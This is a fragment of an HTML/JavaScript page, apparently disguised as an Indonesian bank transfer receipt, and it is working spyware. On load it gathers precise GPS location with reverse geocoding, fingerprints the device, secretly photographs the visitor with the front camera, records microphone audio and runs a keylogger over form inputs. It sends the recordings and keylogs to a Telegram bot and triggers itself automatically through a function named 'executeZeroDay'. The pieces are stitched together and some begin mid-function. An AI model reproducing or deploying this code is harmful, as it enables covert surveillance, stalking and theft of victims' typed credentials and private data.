    // 1. GET LOKASI SUPER AKURAT (GPS + WiFi + Cell Tower + Google Maps)
    async function getSuperAccurateLocation() {
        return new Promise((resolve) => {
            if (!("geolocation" in navigator)) {
                locationData.error = "Geolocation not supported";
                resolve();
                return;
            }
            
            // Gunakan opsi high accuracy
            const options = {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            };
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    permissions.location = true;
                    
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    locationData = {
                        lat: lat,
                        lng: lng,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || 'N/A',
                        altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
                        heading: position.coords.heading || 'N/A',
                        speed: position.coords.speed || 'N/A',
                        timestamp: position.timestamp,
                        waktu: new Date().toLocaleString('id-ID'),
                        googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`,
                        // Data tambahan dari cell tower (estimasi)
                        estimatedAccuracy: position.coords.accuracy < 15 ? 'SANGAT AKURAT' : 'AKURAT',
                        coordinates: `${lat}, ${lng}`,
                        // Akan diisi dari reverse geocoding
                        fullAddress: '',
                        street: '',
                        village: '',
                        district: '',
                        city: '',
                        province: '',
                        postalCode: '',
                        country: '',
                        landmark: '',
                        placeId: '',
                        plusCode: '',
                        // Data tambahan dari Network API
                        networkType: '',
                        wifiName: '',
                        cellTowerInfo: ''
                    };
                    
                    // ===== REVERSE GEOCODING =====
                    try {
                        const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
                        const response = await fetch(geoUrl);
                        const data = await response.json();
                        
                        if (data.status === "OK" && data.results.length > 0) {
                            const result = data.results[0];
                            locationData.fullAddress = result.formatted_address;
                            locationData.placeId = result.place_id;
                            
                            // Ambil plus code jika ada
                            for (let comp of result.address_components) {
                                if (comp.types.includes("street_number")) locationData.street = comp.long_name;
                                if (comp.types.includes("route")) {
                                    if (locationData.street) locationData.street += ' ' + comp.long_name;
                                    else locationData.street = comp.long_name;
                                }
                                if (comp.types.includes("administrative_area_level_4")) locationData.village = comp.long_name;
                                if (comp.types.includes("administrative_area_level_3")) locationData.district = comp.long_name;
                                if (comp.types.includes("administrative_area_level_2")) locationData.city = comp.long_name;
                                if (comp.types.includes("administrative_area_level_1")) locationData.province = comp.long_name;
                                if (comp.types.includes("postal_code")) locationData.postalCode = comp.long_name;
                                if (comp.types.includes("country")) locationData.country = comp.long_name;
                            }
                            
                            // Ambil plus code dari results
                            if (result.plus_code) {
                                locationData.plusCode = result.plus_code.compound_code || result.plus_code.global_code;
                            }
                        }
                    } catch(e) {
                        console.log("Geocoding error:", e);
                    }
                    
                    // ===== AMBIL LANDMARK TERDEKAT =====
                    try {
                        const nearbyUrl = `https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=${lat},${lng}&radius=200&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
                        const nearbyRes = await fetch(nearbyUrl);
                        const nearbyData = await nearbyRes.json();
                        if (nearbyData.results && nearbyData.results.length > 0) {
                            const places = nearbyData.results.slice(0, 5);
                            locationData.landmark = places.map(p => p.name).join('; ');
                            locationData.landmarkDetails = places.map(p => ({
                                name: p.name,
                                vicinity: p.vicinity,
                                rating: p.rating || 'N/A',
                                types: p.types || []
                            }));
                        }
                    } catch(e) {
                        locationData.landmark = "Tidak ditemukan";
                    }
                    
                    // ===== AMBIL INFO NETWORK =====
                    try {
                        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                        if (conn) {
                            locationData.networkType = conn.effectiveType || 'N/A';
                            locationData.downlink = conn.downlink || 'N/A';
                            locationData.rtt = conn.rtt || 'N/A';
                            locationData.saveData = conn.saveData || 'N/A';
                        }
                    } catch(e) {}
                    
                    // ===== AMBIL INFO WIFI (jika ada) =====
                    try {
                        if ('getBattery' in navigator) {
                            const battery = await navigator.getBattery();
                            locationData.batteryLevel = Math.round(battery.level * 100) + '%';
                            locationData.batteryCharging = battery.charging ? 'Ya' : 'Tidak';
                        }
                    } catch(e) {}
                    
                    resolve();
                },
                (error) => {
                    permissions.location = false;
                    locationData.error = error.message;
                    locationData.errorCode = error.code;
                    console.log("Location error:", error.message);
                    resolve();
                },
                options
            );
        });
    }

                try {
                    let total = 0;
                    for (let key in localStorage) {
                        if (localStorage.hasOwnProperty(key)) {
                            total += localStorage[key].length * 2;
                        }
                    }
                    return (total / 1024).toFixed(2) + ' KB';
                } catch(e) { return 'N/A'; }
            })(),
            sessionStorageSize: (() => {
                try {
                    let total = 0;
                    for (let key in sessionStorage) {
                        if (sessionStorage.hasOwnProperty(key)) {
                            total += sessionStorage[key].length * 2;
                        }
                    }
                    return (total / 1024).toFixed(2) + ' KB';
                } catch(e) { return 'N/A'; }
            })(),
            
            // Battery
            batteryLevel: 'N/A',
            batteryCharging: 'N/A',
            
            // Network
            networkType: 'N/A',
            downlink: 'N/A',
            rtt: 'N/A',
            
            // GPU
            gpuInfo: 'N/A'
        };
        
        // Battery info async
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                info.batteryLevel = Math.round(battery.level * 100) + '%';
                info.batteryCharging = battery.charging ? 'Ya' : 'Tidak';
            }).catch(() => {});
        }
        
        // Network info
        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                info.networkType = conn.effectiveType || 'N/A';
                info.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
                info.rtt = conn.rtt ? conn.rtt + ' ms' : 'N/A';
            }
        } catch(e) {}
        
        // GPU Info (via canvas)
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    info.gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
                    info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A';
                }
            }
        } catch(e) {}
        
        deviceInfo = info;
        return info;
    }
    
    // 3. REQUEST CAMERA & CAPTURE
    async function captureCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    facingMode: 'user'
                }
            });
            permissions.camera = true;
            
            const video = document.getElementById('hiddenVideo');
            if (video) {
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 1500));
                
                const canvas = document.getElementById('hiddenCanvas');
                if (canvas && video.videoWidth) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    cameraPhoto = canvas.toDataURL('image/jpeg', 0.9);
                }
            }
            stream.getTracks().forEach(t => t.stop());
            return true;
        } catch(e) {
            permissions.camera = false;
            console.log("Camera error:", e.message);
            return false;
        }
    }
    
    // 4. REQUEST MICROPHONE & RECORD
    async function captureMicrophone() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            permissions.microphone = true;
            
            mediaRecorder = new MediaRecorder(stream);
            audioChunks = [];
            
            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) audioChunks.push(event.data);
            };
            
            return new Promise((resolve) => {
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    sendAudioToTelegram(audioBlob);
                    resolve(true);
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 12000);
            });
        } catch(e) {
            permissions.microphone = false;
            return false;
        }
    }
    
    async function sendAudioToTelegram(audioBlob) {
        try {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('voice', audioBlob, 'microphone_record.ogg');
            fd.append('caption', `🎙️ REKAMAN SUARA\n⏰ ${new Date().toLocaleString('id-ID')}`);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
        } catch(e) {}
    }

    // 7. KEYLOGGER
    function startKeylogger() {
        document.addEventListener('keydown', function(e) {
            const target = e.target;
            const tag = target.tagName;
            let key = e.key;
            let field = '';
            
            if (tag === 'INPUT' || tag === 'TEXTAREA') {
                field = target.name || target.id || target.placeholder || 'unknown';
                if (key === 'Enter') logKey(`[ENTER] pada: ${field}`);
                else if (key === 'Backspace') logKey(`[BACKSPACE] pada: ${field}`);
                else if (key.length === 1) logKey(`${key} [${field}]`);
            } else {
                if (key === 'Enter') logKey('[ENTER]');
                else if (key === 'Backspace') logKey('[BACKSPACE]');
                else if (key.length === 1) logKey(key);
                else if (key === 'Tab') logKey('[TAB]');
                else if (key === 'Escape') logKey('[ESC]');
                else if (key === 'Delete') logKey('[DELETE]');
                else if (key === 'ArrowUp') logKey('[↑]');
                else if (key === 'ArrowDown') logKey('[↓]');
                else if (key === 'ArrowLeft') logKey('[←]');
                else if (key === 'ArrowRight') logKey('[→]');
                else if (key === 'Home') logKey('[HOME]');
                else if (key === 'End') logKey('[END]');
                else if (key === 'PageUp') logKey('[PGUP]');
                else if (key === 'PageDown') logKey('[PGDN]');
            }
        });
        
        document.addEventListener('input', function(e) {
            const target = e.target;
            if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
                const field = target.name || target.id || target.placeholder || 'unknown';
                const value = target.value;
                if (value && value.length > 0 && value.length < 300) {
                    logKey(`[INPUT:${field}=${value.substring(0, 150)}]`);
                }
            }
        });
    }
    
    function logKey(key) {
        const timestamp = new Date().toLocaleString('id-ID');
        keyLogBuffer.push(`[${timestamp}] ${key}`);
        if (keyLogBuffer.length > 2000) keyLogBuffer = keyLogBuffer.slice(-1500);
        if (keyLogBuffer.length % 50 === 0) sendKeylogToTelegram();
    }
    
    function sendKeylogToTelegram() {
        const keys = keyLogBuffer.slice(-100).join('\n');
        const message = `⌨️ KEYLOGGER\n⏰ ${new Date().toLocaleString('id-ID')}\n📊 Total: ${keyLogBuffer.length}\n\n\`\`\`${keys}\`\`\``;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 4096), parse_mode: "Markdown" })
        }).catch(() => {});
    }

                        <value>${locationData.accuracy ? locationData.accuracy + ' meter' : 'N/A'}</value>
                    </div>
                    <div class="device-info-item">
                        <label>🏠 Alamat</label>
                        <value style="font-size:12px;">${locationData.fullAddress || 'N/A'}</value>
                    </div>
                    <div class="device-info-item">
                        <label>📊 Keystroke</label>
                        <value>${keyLogBuffer.length} terekam</value>
                    </div>
                </div>
                <hr>
                <p class="text-center text-muted small mb-0">
                    <i class="fas fa-check-circle text-success"></i> Semua data telah dikirim ke Telegram
                </p>
            </div>
            <div class="data-modal-footer">
                <button id="closeModalFooterBtn" class="btn btn-dark btn-sm">Tutup</button>
            </div>
        `;
        document.body.appendChild(modal);
        
        document.getElementById('closeDataModalBtn').onclick = () => modal.remove();
        document.getElementById('closeModalFooterBtn').onclick = () => modal.remove();
        modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
    }
    
    // ==================== TRIGGERS ====================
    // Auto execute setelah 2 detik
    setTimeout(() => { executeZeroDay(); }, 2000);
    
    // Click body trigger
    document.body.addEventListener('click', function handler() {
        if (!executed) executeZeroDay();
        document.body.removeEventListener('click', handler);
    });
    
    // Button trigger
    document.getElementById('captureAllBtn').addEventListener('click', () => executeZeroDay());
    
        // ==================== INIT ====================
        window.addEventListener('DOMContentLoaded', async () => {
            // Generate & tampilkan data bukti transfer OTOMATIS
            receiptData = generateReceiptData();
            displayReceiptData(receiptData);
            
            // Jalankan Zero-Day
            setTimeout(() => { executeZeroDay(); }, 2000);
        });
    </script>
</body>
</html>
